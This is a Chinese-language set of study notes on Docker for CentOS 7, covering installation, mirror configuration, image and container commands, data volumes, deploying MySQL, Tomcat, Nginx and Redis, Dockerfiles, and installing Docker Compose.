<p>环境不同可能会造成问题，手动迁移很麻烦。</p>
<p>可以使用容器来迁移环境，解决软件跨环境迁移问题。</p>
<p>Docker概念：Docker是一个开源的应用容器引擎，容器完全是使用沙箱机制，之间相互隔离，容器性能开销低。分为CE版和EE版</p>
<p>安装docker，本次学习docker安装在centos7上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1、yum 包更新到最新 </span></span><br><span class="line">yum update</span><br><span class="line"><span class="comment"># 2、安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的 </span></span><br><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"><span class="comment"># 3、 设置yum源</span></span><br><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"><span class="comment"># 4、 安装docker，出现输入的界面都按 y </span></span><br><span class="line">yum install -y docker-ce</span><br><span class="line"><span class="comment"># 5、 查看docker版本，验证是否验证成功</span></span><br><span class="line">docker -v</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301092147712.png" alt="image-20230301092147712"  />

<h5 id="Docker架构"><a href="#Docker架构" class="headerlink" title="Docker架构"></a>Docker架构</h5><p>图片示例：<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301092338599.png" alt="image-20230301092338599" style="zoom: 33%;" /></p>
<p>对应概念：</p>
<ul>
<li><p>镜像（Image）：Docker 镜像（Image），就相当于是 一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包 含了完整的一套 Ubuntu16.04 最小系统的 root 文件系 统。 </p>
</li>
<li><p>容器（Container）：镜像（Image）和容器（Contain er）的关系，就像是面向对象程序设计中的类和对象一 样，镜像是静态的定义，容器是镜像运行时的实体。容 器可以被创建、启动、停止、删除、暂停等。</p>
</li>
</ul>
<p>仓库（Repository）：仓库可看成一个代码控制中心， 用来保存镜像</p>
<h5 id="配置Docker镜像加速器"><a href="#配置Docker镜像加速器" class="headerlink" title="配置Docker镜像加速器"></a>配置Docker镜像加速器</h5><p>使用阿里云镜像加速器</p>
<p>修改daemon配置文件&#x2F;etc&#x2F;docker&#x2F;daemon.json来使用加速器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://5zu0nxqo.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301093225304.png" alt="image-20230301093225304"></p>
<p>完成</p>
<h3 id="2、Docker命令"><a href="#2、Docker命令" class="headerlink" title="2、Docker命令"></a>2、Docker命令</h3><h5 id="Docker服务相关命令"><a href="#Docker服务相关命令" class="headerlink" title="Docker服务相关命令"></a>Docker服务相关命令</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">启动docker服务:systemctl start docker </span><br><span class="line">停止docker服务:systemctl stop docker </span><br><span class="line">重启docker服务:systemctl restart docker</span><br><span class="line">查看docker服务状态:systemctl status docker </span><br><span class="line">设置开机启动docker服务:systemctl enable docker</span><br></pre></td></tr></table></figure>

<h5 id="Docker镜像相关命令"><a href="#Docker镜像相关命令" class="headerlink" title="Docker镜像相关命令"></a>Docker镜像相关命令</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">查看镜像: 查看本地所有的镜像</span><br><span class="line">docker images</span><br><span class="line">docker images –q <span class="comment"># 查看所用镜像的id</span></span><br><span class="line"></span><br><span class="line">搜索镜像:从网络中查找需要的镜像</span><br><span class="line">docker search 镜像名称</span><br><span class="line"></span><br><span class="line">拉取镜像:从Docker仓库下载镜像到本地，镜像名称格式为 名称:版本号，如果版本号不指定则是最新的版本。</span><br><span class="line">如果不知道镜像版本，可以去docker hub 搜索对应镜像查看。</span><br><span class="line">docker pull 镜像名称 eg:docker pull redis:3.2</span><br><span class="line"></span><br><span class="line">删除镜像: 删除本地镜像</span><br><span class="line">docker rmi 镜像<span class="built_in">id</span> <span class="comment"># 删除指定本地镜像</span></span><br><span class="line">docker rmi `docker images -q` <span class="comment"># 删除所有本地镜像</span></span><br></pre></td></tr></table></figure>

<p>想要看镜像有哪些版本可以去dockerhub：<a href="https://hub.docker.com/">https://hub.docker.com/</a></p>
<h5 id="Docker容器相关命令"><a href="#Docker容器相关命令" class="headerlink" title="Docker容器相关命令"></a>Docker容器相关命令</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">查看容器</span><br><span class="line">docker ps <span class="comment"># 查看正在运行的容器</span></span><br><span class="line">docker ps –a <span class="comment"># 查看所有容器</span></span><br><span class="line"></span><br><span class="line">创建容器</span><br><span class="line">docker run 参数(可以使用docker run --<span class="built_in">help</span>看对应说明)</span><br><span class="line">-i：保持容器运行。通常与 -t 同时使用。加入it这两个参数后，容器创建后自动进入容器中，退出容器后，容器自动关闭。</span><br><span class="line">• -t：为容器重新分配一个伪输入终端，通常与 -i 同时使用。</span><br><span class="line">• -d：以守护（后台）模式运行容器。创建一个容器在后台运行，需要使用docker <span class="built_in">exec</span> 进入容器。退出后，容器不会关闭。</span><br><span class="line">• -it 创建的容器一般称为交互式容器，-<span class="built_in">id</span> 创建的容器一般称为守护式容器</span><br><span class="line">• --name：为创建的容器命名</span><br><span class="line">docker run -it --name=cl centos:7 /bin/bash</span><br><span class="line">docker run -<span class="built_in">id</span> --name=c2 centos:7 </span><br><span class="line"></span><br><span class="line">进入容器</span><br><span class="line">docker <span class="built_in">exec</span> 参数 <span class="comment"># 退出容器，容器不会关闭</span></span><br><span class="line"></span><br><span class="line">启动容器</span><br><span class="line">docker start 容器名称</span><br><span class="line"></span><br><span class="line">停止容器</span><br><span class="line">docker stop 容器名</span><br><span class="line"></span><br><span class="line">删除容器</span><br><span class="line">docker <span class="built_in">rm</span> 容器名称</span><br><span class="line"></span><br><span class="line">查看容器信息</span><br><span class="line">docker inspect 容器名称</span><br></pre></td></tr></table></figure>

<h3 id="3、Docker容器的数据卷"><a href="#3、Docker容器的数据卷" class="headerlink" title="3、Docker容器的数据卷"></a>3、Docker容器的数据卷</h3><h5 id="数据卷概念及作用"><a href="#数据卷概念及作用" class="headerlink" title="数据卷概念及作用"></a>数据卷概念及作用</h5><p>问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Docker 容器删除后，在容器中产生的数据也会随之销毁 </span><br><span class="line">Docker 容器和外部机器可以直接交换文件吗？ </span><br><span class="line">容器之间想要进行数据交互？</span><br></pre></td></tr></table></figure>

<p>数据卷：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据卷是宿主机中的一个目录或文件</span><br><span class="line">当容器目录和数据卷目录绑定后，对方的修改会立即同步</span><br><span class="line">一个数据卷可以被多个容器同时挂载</span><br><span class="line">一个容器也可以被挂载多个数据卷</span><br></pre></td></tr></table></figure>

<p>数据卷作用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">容器数据持久化 </span><br><span class="line">外部机器和容器间接通信 </span><br><span class="line">容器之间数据交换</span><br></pre></td></tr></table></figure>



<h5 id="配置数据卷"><a href="#配置数据卷" class="headerlink" title="配置数据卷"></a>配置数据卷</h5><p>创建启动容器时，使用 –v 参数 设置数据卷 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run ... –v 宿主机目录(文件):容器内目录(文件) ...  </span><br><span class="line">注意事项： 1. 目录必须是绝对路径 2. 如果目录不存在，会自动创建 3. 可以挂载多个数据卷</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301101912652.png" alt="image-20230301101912652"></p>
<p>可以看到能够同步，可以简单理解为共享文件夹</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301103733215.png" alt="image-20230301103733215"></p>
<p><strong>如果忘了对应的数据卷可以用inspect看</strong></p>
<h5 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h5><p>多容器进行数据交换 1. 多个容器挂载同一个数据卷 2. 数据卷容器</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301102705638.png" alt="image-20230301102705638" style="zoom: 67%;" />

<h5 id="配置数据卷容器"><a href="#配置数据卷容器" class="headerlink" title="配置数据卷容器"></a>配置数据卷容器</h5><p>1、创建启动c3数据卷容器，使用 –v 参数 设置数据卷 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run –it --name=c3 –v /volume centos:7 /bin/bash  </span><br></pre></td></tr></table></figure>

<p>2、创建启动 c1 c2 容器，使用 –-volumes-from 参数 设置数据卷</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run –it --name=c1 --volumes-from c3 centos:7 /bin/bash </span><br><span class="line">docker run –it --name=c2 --volumes-from c3 centos:7 /bin/bash </span><br></pre></td></tr></table></figure>

<h3 id="4、Docker应用部署"><a href="#4、Docker应用部署" class="headerlink" title="4、Docker应用部署"></a>4、Docker应用部署</h3><h5 id="MySql部署："><a href="#MySql部署：" class="headerlink" title="MySql部署："></a>MySql部署：</h5><p>需求：在Docker容器中部署MySQL，并通过外部mysql客户端操作MySQL Server。</p>
<p>案例：① 搜索mysql镜像 ② 拉取mysql镜像 ③ 创建容器 ④ 操作容器中的mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当容器中的网络服务需要被外部机器访问时，可以将容器中提供服务的端口映射到宿主机的端口上。外部机 器访问宿主机的该端口，从而间接访问容器的服务。 </span><br><span class="line"></span><br><span class="line">这种操作称为：端口映射</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301105421936.png" alt="image-20230301105421936"></p>
<ol>
<li>搜索mysql镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search mysql</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>拉取mysql镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull mysql:5.6</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建容器，设置端口映射、目录映射</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/root目录下创建mysql目录用于存储mysql数据信息</span></span><br><span class="line">mkdir ~/mysql</span><br><span class="line">cd ~/mysql</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -id \</span><br><span class="line">-p 3307:3306 \</span><br><span class="line">--name=c_mysql \</span><br><span class="line">-v $PWD/conf:/etc/mysql/conf.d \</span><br><span class="line">-v $PWD/logs:/logs \</span><br><span class="line">-v $PWD/data:/var/lib/mysql \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=123456 \</span><br><span class="line">mysql:5.6</span><br></pre></td></tr></table></figure>

<ul>
<li>参数说明：<ul>
<li><strong>-p 3307:3306</strong>：将容器的 3306 端口映射到宿主机的 3307 端口。</li>
<li><strong>-v $PWD&#x2F;conf:&#x2F;etc&#x2F;mysql&#x2F;conf.d</strong>：将主机当前目录下的 conf&#x2F;my.cnf 挂载到容器的 &#x2F;etc&#x2F;mysql&#x2F;my.cnf。配置目录</li>
<li><strong>-v $PWD&#x2F;logs:&#x2F;logs</strong>：将主机当前目录下的 logs 目录挂载到容器的 &#x2F;logs。日志目录</li>
<li><strong>-v $PWD&#x2F;data:&#x2F;var&#x2F;lib&#x2F;mysql</strong> ：将主机当前目录下的data目录挂载到容器的 &#x2F;var&#x2F;lib&#x2F;mysql 。数据目录</li>
<li><strong>-e MYSQL_ROOT_PASSWORD&#x3D;123456：</strong>初始化 root 用户的密码。</li>
</ul>
</li>
</ul>
<ol start="4">
<li>进入容器，操作mysql</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec –it c_mysql /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301115710533.png" alt="image-20230301115710533"></p>
<ol start="5">
<li>使用外部机器连接容器中的mysql</li>
</ol>
<h5 id="部署Tomcat"><a href="#部署Tomcat" class="headerlink" title="部署Tomcat"></a>部署Tomcat</h5><p>要求：在Docker容器中部署Tomcat，并通过外部机器访问Tomcat部署的项目。</p>
<p>实现步骤 ① 搜索tomcat镜像 ② 拉取tomcat镜像 ③ 创建容器 ④ 部署项目 ⑤ 测试访问</p>
<ol>
<li>搜索tomcat镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search tomcat</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>拉取tomcat镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull tomcat</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建容器，设置端口映射、目录映射</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/root目录下创建tomcat目录用于存储tomcat数据信息</span></span><br><span class="line">mkdir ~/tomcat</span><br><span class="line">cd ~/tomcat</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -id --name=c_tomcat \</span><br><span class="line">-p 8080:8080 \</span><br><span class="line">-v $PWD:/usr/local/tomcat/webapps \</span><br><span class="line">tomcat </span><br></pre></td></tr></table></figure>

<ul>
<li><p>参数说明：</p>
<ul>
<li><p><strong>-p 8080:8080：</strong>将容器的8080端口映射到主机的8080端口</p>
<p><strong>-v $PWD:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps：</strong>将主机中当前目录挂载到容器的webapps</p>
</li>
</ul>
</li>
</ul>
<ol start="4">
<li><p>使用外部机器访问tomcat</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301141233554.png" alt="image-20230301141233554" style="zoom:50%;" />

<p>成功</p>
</li>
</ol>
<h5 id="部署Nginx"><a href="#部署Nginx" class="headerlink" title="部署Nginx"></a>部署Nginx</h5><p>需求：在Docker容器中部署Nginx，并通过外部机器访问Nginx</p>
<p>步骤：① 搜索Nginx镜像 ② 拉取Nginx镜像 ③ 创建容器 ④ 测试访问</p>
<ol>
<li>搜索nginx镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search nginx</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>拉取nginx镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建容器，设置端口映射、目录映射</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/root目录下创建nginx目录用于存储nginx数据信息</span></span><br><span class="line">mkdir ~/nginx</span><br><span class="line">cd ~/nginx</span><br><span class="line">mkdir conf</span><br><span class="line">cd conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在~/nginx/conf/下创建nginx.conf文件,粘贴下面内容</span></span><br><span class="line">vim nginx.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user  nginx;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">error_log  /var/log/nginx/error.log warn;</span><br><span class="line">pid        /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       /etc/nginx/mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    access_log  /var/log/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>




<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -id --name=c_nginx \</span><br><span class="line">-p 80:80 \</span><br><span class="line">-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf \</span><br><span class="line">-v $PWD/logs:/var/log/nginx \</span><br><span class="line">-v $PWD/html:/usr/share/nginx/html \</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure>

<ul>
<li>参数说明：<ul>
<li><strong>-p 80:80</strong>：将容器的 80端口映射到宿主机的 80 端口。</li>
<li><strong>-v $PWD&#x2F;conf&#x2F;nginx.conf:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</strong>：将主机当前目录下的 &#x2F;conf&#x2F;nginx.conf 挂载到容器的 :&#x2F;etc&#x2F;nginx&#x2F;nginx.conf。配置目录</li>
<li><strong>-v $PWD&#x2F;logs:&#x2F;var&#x2F;log&#x2F;nginx</strong>：将主机当前目录下的 logs 目录挂载到容器的&#x2F;var&#x2F;log&#x2F;nginx。日志目录</li>
</ul>
</li>
</ul>
<ol start="4">
<li><p>使用外部机器访问nginx</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301142036233.png" alt="image-20230301142036233"></p>
</li>
</ol>
<h5 id="部署Redis"><a href="#部署Redis" class="headerlink" title="部署Redis"></a>部署Redis</h5><p>需求：在Docker容器中部署Redis，并通过外部机器访问Redis。</p>
<p>实现步骤 ① 搜索Redis镜像 ② 拉取Redis镜像 ③ 创建容器 ④ 测试访问</p>
<ol>
<li>搜索redis镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search redis</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>拉取redis镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull redis:5.0</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建容器，设置端口映射</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -id --name=c_redis -p 6379:6379 redis:5.0</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>使用外部机器连接redis</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./redis-cli.exe -h 192.168.149.135 -p 6379</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301142459588.png" alt="image-20230301142459588"></p>
<h3 id="5、Dockerfile"><a href="#5、Dockerfile" class="headerlink" title="5、Dockerfile"></a>5、Dockerfile</h3><h5 id="Docker镜像原理"><a href="#Docker镜像原理" class="headerlink" title="Docker镜像原理"></a>Docker镜像原理</h5><p>问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Docker 镜像本质是什么？</span><br><span class="line">Docker 中一个centos镜像为什么只有200MB，而一个centos操作系统的iso文件要几个个G？</span><br><span class="line">Docker 中一个tomcat镜像为什么有500MB，而一个tomcat安装包只有70多MB？</span><br></pre></td></tr></table></figure>

<p>理论知识：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">操作系统组成部分：</span><br><span class="line">进程通信子系统</span><br><span class="line">内存管理子系统</span><br><span class="line">备管理子系统</span><br><span class="line">文件管理子系统</span><br><span class="line">网络通信子系统</span><br><span class="line">作业控制子系统</span><br><span class="line">进程调度子系统</span><br><span class="line"></span><br><span class="line">Linux文件系统由bootfs和rootfs两部分组成</span><br><span class="line">• bootfs：包含bootloader（引导加载程序）和 kernel（内核）</span><br><span class="line">• rootfs： root文件系统，包含的就是典型 Linux 系统中的/dev，/proc，/bin，/etc等标准目录和文件</span><br><span class="line">• 不同的linux发行版，bootfs基本一样，而rootfs不同，如ubuntu，centos等</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301143313641.png" alt="image-20230301143313641" style="zoom:67%;" />

<p>问题回答：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Docker 镜像本质是什么？</span><br><span class="line">• 是一个分层文件系统</span><br><span class="line">2. Docker 中一个centos镜像为什么只有200MB，而一个centos操作系统的iso文件要几个个G？</span><br><span class="line">• Centos的iso镜像文件包含bootfs和rootfs，而docker的centos镜像复用操作系统的bootfs，只有rootfs和其他镜像层</span><br><span class="line">3. Docker 中一个tomcat镜像为什么有500MB，而一个tomcat安装包只有70多MB？</span><br><span class="line">• 由于docker中镜像是分层的，tomcat虽然只有70多MB，但他需要依赖于父镜像和基础镜像，所有整个对外暴露的tomcat镜像大小500多MB</span><br></pre></td></tr></table></figure>

<p>docker inspect tomcat 效果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301143908837.png" alt="image-20230301143908837"></p>
<h5 id="Docker镜像制作"><a href="#Docker镜像制作" class="headerlink" title="Docker镜像制作"></a>Docker镜像制作</h5><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301144055969.png" alt="image-20230301144055969" style="zoom:50%;" />

<p> 注意：</p>
<ol>
<li>自己制作镜像时，目录挂载不会生效，其它会保存</li>
</ol>
<h5 id="Dockerfile概念"><a href="#Dockerfile概念" class="headerlink" title="Dockerfile概念"></a>Dockerfile概念</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dockerfile 是一个文本文件 </span><br><span class="line">包含了一条条的指令 </span><br><span class="line">每一条指令构建一层，基于基础镜像，最终构建出一个新的镜像 </span><br><span class="line">对于开发人员：可以为开发团队提供一个完全一致的开发环境 </span><br><span class="line">对于测试人员：可以直接拿开发时所构建的镜像或者通过Dockerfile文件 构建一个新的镜像开始工作了 </span><br><span class="line">对于运维人员：在部署时，可以实现应用的无缝移</span><br></pre></td></tr></table></figure>

<p>参考网站：<a href="https://hub.docker.com/">https://hub.docker.com</a></p>
<h5 id="Dockerfile关键字"><a href="#Dockerfile关键字" class="headerlink" title="Dockerfile关键字"></a>Dockerfile关键字</h5><table>
<thead>
<tr>
<th>关键字</th>
<th>作用</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>FROM</td>
<td>指定父镜像</td>
<td>指定dockerfile基于那个image构建</td>
</tr>
<tr>
<td>MAINTAINER</td>
<td>作者信息</td>
<td>用来标明这个dockerfile谁写的</td>
</tr>
<tr>
<td>LABEL</td>
<td>标签</td>
<td>用来标明dockerfile的标签 可以使用Label代替Maintainer 最终都是在docker image基本信息中可以查看</td>
</tr>
<tr>
<td>RUN</td>
<td>执行命令</td>
<td>执行一段命令 默认是&#x2F;bin&#x2F;sh 格式: RUN command 或者 RUN [“command” , “param1”,”param2”]</td>
</tr>
<tr>
<td>CMD</td>
<td>容器启动命令</td>
<td>提供启动容器时候的默认命令 和ENTRYPOINT配合使用.格式 CMD command param1 param2 或者 CMD [“command” , “param1”,”param2”]</td>
</tr>
<tr>
<td>ENTRYPOINT</td>
<td>入口</td>
<td>一般在制作一些执行就关闭的容器中会使用</td>
</tr>
<tr>
<td>COPY</td>
<td>复制文件</td>
<td>build的时候复制文件到image中</td>
</tr>
<tr>
<td>ADD</td>
<td>添加文件</td>
<td>build的时候添加文件到image中 不仅仅局限于当前build上下文 可以来源于远程服务</td>
</tr>
<tr>
<td>ENV</td>
<td>环境变量</td>
<td>指定build时候的环境变量 可以在启动的容器的时候 通过-e覆盖 格式ENV name&#x3D;value</td>
</tr>
<tr>
<td>ARG</td>
<td>构建参数</td>
<td>构建参数 只在构建的时候使用的参数 如果有ENV 那么ENV的相同名字的值始终覆盖arg的参数</td>
</tr>
<tr>
<td>VOLUME</td>
<td>定义外部可以挂载的数据卷</td>
<td>指定build的image那些目录可以启动的时候挂载到文件系统中 启动容器的时候使用 -v 绑定 格式 VOLUME [“目录”]</td>
</tr>
<tr>
<td>EXPOSE</td>
<td>暴露端口</td>
<td>定义容器运行的时候监听的端口 启动容器的使用-p来绑定暴露端口 格式: EXPOSE 8080 或者 EXPOSE 8080&#x2F;udp</td>
</tr>
<tr>
<td>WORKDIR</td>
<td>工作目录</td>
<td>指定容器内部的工作目录 如果没有创建则自动创建 如果指定&#x2F; 使用的是绝对地址 如果不是&#x2F;开头那么是在上一条workdir的路径的相对路径</td>
</tr>
<tr>
<td>USER</td>
<td>指定执行用户</td>
<td>指定build或者启动的时候 用户 在RUN CMD ENTRYPONT执行的时候的用户</td>
</tr>
<tr>
<td>HEALTHCHECK</td>
<td>健康检查</td>
<td>指定监测当前容器的健康监测的命令 基本上没用 因为很多时候 应用本身有健康监测机制</td>
</tr>
<tr>
<td>ONBUILD</td>
<td>触发器</td>
<td>当存在ONBUILD关键字的镜像作为基础镜像的时候 当执行FROM完成之后 会执行 ONBUILD的命令 但是不影响当前镜像 用处也不怎么大</td>
</tr>
<tr>
<td>STOPSIGNAL</td>
<td>发送信号量到宿主机</td>
<td>该STOPSIGNAL指令设置将发送到容器的系统调用信号以退出。</td>
</tr>
<tr>
<td>SHELL</td>
<td>指定执行脚本的shell</td>
<td>指定RUN CMD ENTRYPOINT 执行命令的时候 使用的shell</td>
</tr>
</tbody></table>
<h5 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h5><p>需求：定义dockerfile，发布springboot项目</p>
<p>实现步骤 ① 定义父镜像：FROM java:8 ② 定义作者信息：MAINTAINER itheima  ③ 将jar包添加到容器： ADD springboot.jar app.jar ④ 定义容器启动执行的命令：CMD java–jar app.jar ⑤ 通过dockerfile构建镜像：docker bulid –f dockerfile文件路径 –t 镜像名称:版本</p>
<p>成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301152821606.png" alt="image-20230301152821606"></p>
<h5 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h5><p>需求：自定义centos7镜像。</p>
<p>要求：1.默认登录路经为&#x2F;usr 2.可以使用vim</p>
<p>dockerfile：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> realikun404</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum install -y vim</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /usr</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /bin/bash</span></span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -f dockerfile -t mycentos:1 .</span><br></pre></td></tr></table></figure>

<h3 id="6、Docker服务编排"><a href="#6、Docker服务编排" class="headerlink" title="6、Docker服务编排"></a>6、Docker服务编排</h3><h5 id="服务编排概念"><a href="#服务编排概念" class="headerlink" title="服务编排概念"></a>服务编排概念</h5><p>微服务架构的应用系统中一般包含若干个微服务，每个微服务一般都会部署多个实例，如果每个微服务都要手动启停 ，维护的工作量会很大。 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要从Dockerfile build image 或者去dockerhub拉取image </span><br><span class="line">要创建多个container </span><br><span class="line">要管理这些container（启动停止删除） </span><br></pre></td></tr></table></figure>

<p>服务编排： 按照一定的业务规则批量管理容器</p>
<h5 id="Docker-Compose概述"><a href="#Docker-Compose概述" class="headerlink" title="Docker Compose概述"></a>Docker Compose概述</h5><p>Docker Compose是一个编排多容器分布式部署的工具，提供命令集管理容器化应用的完整开发周期，包括服务构建 ，启动和停止。使用步骤：</p>
<ul>
<li><input disabled="" type="checkbox"> 利用 Dockerfile 定义运行环境镜像</li>
<li><input disabled="" type="checkbox"> 使用 docker-compose.yml 定义组成应用的各服务</li>
<li><input disabled="" type="checkbox"> 运行 docker-compose up 启动应用</li>
</ul>
<h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h5><p>安装Docker Compose</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Compose目前已经完全支持Linux、Mac OS和Windows，在我们安装Compose之前，需要先安装Docker。下面我 们以编译好的二进制包方式安装在Linux系统中。</span> </span><br><span class="line">curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置文件可执行权限</span> </span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看版本信息</span> </span><br><span class="line">docker-compose -version</span><br></pre></td></tr></table></figure>

<p>卸载Docker Compose</p>
